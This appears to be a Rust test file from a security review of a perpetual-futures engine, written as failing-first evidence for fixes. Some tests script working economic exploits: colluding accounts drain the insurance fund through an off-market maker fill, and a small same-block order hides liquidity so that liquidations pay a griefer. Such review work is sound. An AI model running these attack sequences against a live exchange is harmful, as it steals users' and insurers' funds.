//! Agent 436 (round 2 review) demonstrations against the engine on `main` `f0e3967` (engine `e2fca75`, SPEC 0.1.6).
//! Copy into `engine/tests/` of an export and run `cargo test --release --test r436_engine -- --nocapture`.
//! A test here PASSES when the DEFECT IS PRESENT (failing-first evidence for the owner's fix), unless its name
//! starts with `control_`. THROWAWAY keys only (testkit). UNAUDITED review tooling, never merged into `main`.
use k256::ecdsa::SigningKey;
use postern_perps_engine::engine::{system_address, Event, FillKind, ACCT_BACKSTOP, ACCT_INSURANCE};
use postern_perps_engine::hash::Addr;
use postern_perps_engine::testkit::*;
use postern_perps_engine::*;

const T0: u64 = 1_794_880_000_000;
const BTC: u32 = 1;
const P: u64 = 6_725_000_000_000; // 67,250.00
const TICK: u64 = 10_000_000;
const ONE: u64 = 100_000_000; // 1 BTC

fn usdc(x: u64) -> u64 {
    x * 1_000_000
}
fn f(x: i128) -> f64 {
    x as f64 / 1e6
}

struct Rig {
    e: Engine,
    ok: Vec<SigningKey>,
    h: u64,
    t: u64,
    dep: u64,
    nonce: u64,
}

impl Rig {
    fn new() -> Rig {
        Rig { e: Engine::new(genesis(7, vec![market(BTC, "BTC-USD")])), ok: oracle_keys(7), h: 0, t: T0, dep: 0, nonce: T0 }
    }
    fn n(&mut self) -> u64 {
        self.nonce = self.nonce.max(self.t) + 1;
        self.nonce
    }
    fn block(&mut self, price: u64, rest: Vec<Input>) -> BlockOutcome {
        self.h += 1;
        self.t += 3000;
        let mut inputs = vec![oracle_round(&self.e, &self.ok, self.t, &[(BTC, price)])];
        inputs.extend(rest);
        self.e.apply_block(&Block { height: self.h, time: self.t, inputs }).expect("block applies")
    }
    fn dep(&mut self, a: Addr, amount: u64) -> Input {
        let i = Input::Deposit { index: self.dep, account: a, amount };
        self.dep += 1;
        i
    }
    fn act(&mut self, k: &SigningKey, a: Action) -> Input {
        sign_action(&self.e, k, a)
    }
    fn order(&mut self, k: &SigningKey, is_buy: bool, ty: u8, tif: u8, price: u64, size: u64) -> Input {
        let n = self.n();
        let a = addr(k);
        self.act(k, place(a, n, BTC, is_buy, ty, tif, price, size, false))
    }
    fn bal(&self, a: &Addr) -> i128 {
        self.e.accounts[self.e.by_addr[a] as usize].balance
    }
    fn ins(&self) -> i128 {
        self.e.accounts[ACCT_INSURANCE as usize].balance
    }
}

fn all_ok(out: &BlockOutcome) {
    assert!(out.outcomes.iter().all(|o| o.is_ok()), "{:?}", out.outcomes);
}

/// R436-1 (High). Two colluding accounts move the insurance fund to themselves with one off-market maker fill.
/// A (2,000 USDC, 50x) rests an ask for 1 BTC at HALF the mark on an empty bid side: the placement check reserves
/// initial margin on `max(mark, price)` = the mark notional only (2%), nothing for the 50% the fill will lose.
/// B (10 USDC) buys it: the taker's per-fill check passes (B gains), and a MAKER is never checked (S-4.9). A's
/// equity is now about -31,630 USDC; step 9 liquidates A and, since the R395-31 fix, INSURANCE pays the whole
/// deficit first; A's short is then closed against B by ADL at about the mark, so B REALISES about 33,600 USDC
/// and withdraws it in the next block. Deposited by the pair: 2,010. Withdrawn: > 33,000. Paid by: INSURANCE.
#[test]
fn r436_1_off_market_maker_fill_moves_the_insurance_fund_to_a_colluding_taker() {
    let mut r = Rig::new();
    let (ka, kb) = (key(4361), key(4362));
    let (a, b) = (addr(&ka), addr(&kb));
    let d0 = r.dep(system_address(ACCT_INSURANCE), usdc(60_000));
    let d1 = r.dep(a, usdc(2_000));
    let d2 = r.dep(b, usdc(10));
    all_ok(&r.block(P, vec![d0, d1, d2]));
    let ins0 = r.ins();
    assert_eq!(ins0, usdc(60_000) as i128);

    let n = r.n();
    let lev = r.act(&ka, Action::UpdateLeverage { account: a, nonce: n, market_id: BTC, leverage: 50, isolated: false });
    let low = P / 2; // 33,625.00: 50% below the mark
    let ask = r.order(&ka, false, ORDER_LIMIT, TIF_GTC, low, ONE);
    let buy = r.order(&kb, true, ORDER_LIMIT, TIF_IOC, low, ONE);
    let out = r.block(P, vec![lev, ask, buy]);
    all_ok(&out);
    let fills: Vec<_> = out.events.iter().filter(|e| matches!(e, Event::Fill { .. })).collect();
    println!("fills: {fills:#?}");
    assert!(out.events.iter().any(|e| matches!(e, Event::Fill { kind: FillKind::Book, price, size, .. } if *price == low && *size == ONE)), "B bought 1 BTC at half the mark");
    let cover: i128 = out.events.iter().filter_map(|e| if let Event::InsuranceCover { amount, .. } = e { Some(*amount) } else { None }).sum();
    println!("insurance before {:.2}, after {:.2}, cover paid {:.2}; A balance {:.2}; B balance {:.2}", f(ins0), f(r.ins()), f(cover), f(r.bal(&a)), f(r.bal(&b)));
    assert!(ins0 - r.ins() > usdc(31_000) as i128, "INSURANCE paid A's manufactured deficit");
    assert!(r.e.accounts[r.e.by_addr[&b] as usize].positions.is_empty(), "B was closed against A by ADL: profit realised");
    assert!(r.bal(&b) > usdc(33_000) as i128);

    let n = r.n();
    let w = r.act(&kb, Action::Withdraw { account: b, nonce: n, amount: usdc(33_000), recipient: b });
    let out = r.block(P, vec![w]);
    all_ok(&out);
    let rec = out.events.iter().find_map(|e| if let Event::Withdrawal(w) = e { Some(w.clone()) } else { None }).expect("withdrawal record");
    println!("withdrawal record for B: {:.2} USDC net (A + B deposited 2,010.00)", f(rec.amount as i128));
    assert!(rec.amount >= usdc(32_999));
    postern_perps_engine::invariants::check(&r.e).expect("the engine's own invariants hold throughout: conservation does not see it");
}

/// R436-1, live-book variant: an honest maker M quotes both sides with 0.2 BTC of bids. A sells 1.2 BTC with limit
/// = half the mark: 0.2 BTC fills fairly against M's bids (taker check passes, the fill is at the market), the
/// remaining 1.0 BTC RESTS at half the mark. B takes it. INSURANCE (60,000) and BACKSTOP (25,000) are funded as
/// 354/392 propose. INSURANCE pays the deficit, the BACKSTOP takes A's short at about the mark, and B holds 1 BTC
/// bought at half price, which it sells to M's next bid at the mark and withdraws.
#[test]
fn r436_1b_same_attack_on_a_live_book_with_funded_insurance_and_backstop() {
    let mut r = Rig::new();
    let (ka, kb, km) = (key(4363), key(4364), key(4365));
    let (a, b, m) = (addr(&ka), addr(&kb), addr(&km));
    let d = vec![
        r.dep(system_address(ACCT_INSURANCE), usdc(60_000)),
        r.dep(system_address(ACCT_BACKSTOP), usdc(25_000)),
        r.dep(a, usdc(2_500)),
        r.dep(b, usdc(10)),
        r.dep(m, usdc(200_000)),
    ];
    all_ok(&r.block(P, d));
    let q = vec![
        r.order(&km, true, ORDER_LIMIT, TIF_GTC, P - 10 * TICK, ONE / 5),
        r.order(&km, false, ORDER_LIMIT, TIF_GTC, P + 10 * TICK, ONE / 5),
    ];
    all_ok(&r.block(P, q));
    let ins0 = r.ins();
    let n = r.n();
    let lev = r.act(&ka, Action::UpdateLeverage { account: a, nonce: n, market_id: BTC, leverage: 50, isolated: false });
    let low = P / 2;
    let ask = r.order(&ka, false, ORDER_LIMIT, TIF_GTC, low, ONE + ONE / 5);
    let buy = r.order(&kb, true, ORDER_LIMIT, TIF_IOC, low, ONE);
    let out = r.block(P, vec![lev, ask, buy]);
    all_ok(&out);
    let bi = r.e.by_addr[&b];
    println!("insurance {:.2} -> {:.2}; B equity {:.2} USDC on 10.00 deposited", f(ins0), f(r.ins()), r.e.equity(bi) as f64 / 1e16);
    assert!(ins0 - r.ins() > usdc(30_000) as i128, "INSURANCE paid the manufactured deficit on a live book too");
    assert!(r.e.equity(bi) > (usdc(33_000) as i128) * 10_000_000_000);
    // M quotes again; B sells its 1 BTC at the market and withdraws.
    let bid = r.order(&km, true, ORDER_LIMIT, TIF_GTC, P - 10 * TICK, ONE);
    all_ok(&r.block(P, vec![bid]));
    let sell = r.order(&kb, false, ORDER_MARKET, TIF_IOC, P - 100 * TICK, ONE);
    all_ok(&r.block(P, vec![sell]));
    let n = r.n();
    let w = r.act(&kb, Action::Withdraw { account: b, nonce: n, amount: usdc(33_000), recipient: b });
    let out = r.block(P, vec![w]);
    all_ok(&out);
    assert!(out.events.iter().any(|e| matches!(e, Event::Withdrawal(w) if w.amount >= usdc(32_999))));
    postern_perps_engine::invariants::check(&r.e).expect("invariants hold");
}

/// Control for R436-1: the same trade with the roles swapped is REFUSED. B rests the bid at half the mark, A sells
/// into it as TAKER: the per-fill check of S-4.9 stops A (`INSUFFICIENT_MARGIN`), nothing fills. Only the maker
/// side is unguarded.
#[test]
fn control_r436_1_the_taker_side_of_the_same_trade_is_refused() {
    let mut r = Rig::new();
    let (ka, kb) = (key(4366), key(4367));
    let (a, b) = (addr(&ka), addr(&kb));
    let d0 = r.dep(system_address(ACCT_INSURANCE), usdc(60_000));
    let d1 = r.dep(a, usdc(2_000));
    let d2 = r.dep(b, usdc(10_000));
    all_ok(&r.block(P, vec![d0, d1, d2]));
    let n = r.n();
    let lev = r.act(&ka, Action::UpdateLeverage { account: a, nonce: n, market_id: BTC, leverage: 50, isolated: false });
    let low = P / 2;
    let bid = r.order(&kb, true, ORDER_LIMIT, TIF_GTC, low, ONE);
    let sell = r.order(&ka, false, ORDER_LIMIT, TIF_IOC, low, ONE);
    let out = r.block(P, vec![lev, bid, sell]);
    assert!(!out.events.iter().any(|e| matches!(e, Event::Fill { .. })), "no fill: the taker is checked");
    assert!(out.events.iter().any(|e| matches!(e, Event::RemainderCancelled { reason: Error::InsufficientMargin, .. })));
    assert_eq!(r.ins(), usdc(60_000) as i128);
}

/// Shared scenario of R436-2: A long 1 BTC against B short 1 BTC (B has 7,000 USDC); D rests an OLD ask for 1 BTC
/// one tick above the price the oracle will reach; the index then rises until B is below maintenance and above
/// bankruptcy. With `grief`, account A places a 0.001 BTC ask at the new index in the SAME block as the move.
/// Returns (B's balance after its liquidation, A's equity in USDC units, price of the fill that closed B, its kind).
fn r436_2_run(grief: bool) -> (i128, i128, u64, FillKind) {
    let mut r = Rig::new();
    let (ka, kb, kd) = (key(4371), key(4372), key(4373));
    let (a, b, d) = (addr(&ka), addr(&kb), addr(&kd));
    let deps = vec![r.dep(a, usdc(100_000)), r.dep(b, usdc(7_000)), r.dep(d, usdc(100_000))];
    all_ok(&r.block(P, deps));
    let i1 = r.order(&ka, true, ORDER_LIMIT, TIF_GTC, P, ONE);
    let i2 = r.order(&kb, false, ORDER_MARKET, TIF_IOC, P - 100 * TICK, ONE);
    all_ok(&r.block(P, vec![i1, i2]));
    let p1 = P / 1000 * 1048 / TICK * TICK;
    let p2 = p1 / 1000 * 1046 / TICK * TICK;
    // D's resting liquidity, placed one block BEFORE the move
    let old_ask = r.order(&kd, false, ORDER_LIMIT, TIF_GTC, p2 + TICK, ONE);
    all_ok(&r.block(p1, vec![old_ask]));
    let mut inputs = Vec::new();
    if grief {
        inputs.push(r.order(&ka, false, ORDER_LIMIT, TIF_GTC, p2, 100_000));
    }
    let out = r.block(p2, inputs);
    all_ok(&out);
    let bi = r.e.by_addr[&b];
    assert!(out.events.iter().any(|e| matches!(e, Event::Liquidated { account } if *account == bi)), "B liquidated in the block of the move");
    let (price, kind) = out
        .events
        .iter()
        .find_map(|e| match e {
            Event::Fill { taker, price, kind, .. } if *taker == bi => Some((*price, *kind)),
            _ => None,
        })
        .expect("a fill closed B");
    let ai = r.e.by_addr[&a];
    (r.bal(&b), r.e.equity(ai) / 10_000_000_000, price, kind)
}

/// R436-2 (Low). `take` in liquidation mode BREAKS at the first same-block maker instead of skipping it
/// (engine.rs:834-838; SPEC 6.3 step 2 "matching stops at the first such order"). Any account (not only the
/// sequencer) that keeps a fresh minimum-size order at the top of the book therefore hides ALL older liquidity
/// from every liquidation of that block: the position goes to the backstop / ADL at the bound price `lp` (mark +/-
/// mmf0/2) although an older order one tick from the mark was resting. Here the griefing account is also the ADL
/// counterparty and pockets the difference; with a funded backstop the backstop receives it.
#[test]
fn r436_2_one_same_block_order_at_the_top_hides_older_liquidity_from_liquidations() {
    let (b_plain, a_plain, price_plain, kind_plain) = r436_2_run(false);
    let (b_grief, a_grief, price_grief, kind_grief) = r436_2_run(true);
    println!("no same-block order : B closed at {price_plain} ({kind_plain:?}), B balance {:.2}, A equity {:.2}", f(b_plain), f(a_plain));
    println!("with 0.001 BTC order: B closed at {price_grief} ({kind_grief:?}), B balance {:.2}, A equity {:.2}", f(b_grief), f(a_grief));
    assert_eq!(kind_plain, FillKind::Liquidation, "without the order the liquidation uses the old resting ask");
    assert_eq!(kind_grief, FillKind::Adl, "with it the book is skipped entirely");
    assert!(price_grief > price_plain, "B (a short) is closed at a worse price");
    assert!(b_plain - b_grief > usdc(100) as i128, "B loses more than 100 USDC more on 1 BTC");
    assert!(a_grief - a_plain > usdc(300) as i128, "the griefing account, as ADL counterparty, gains it");
}
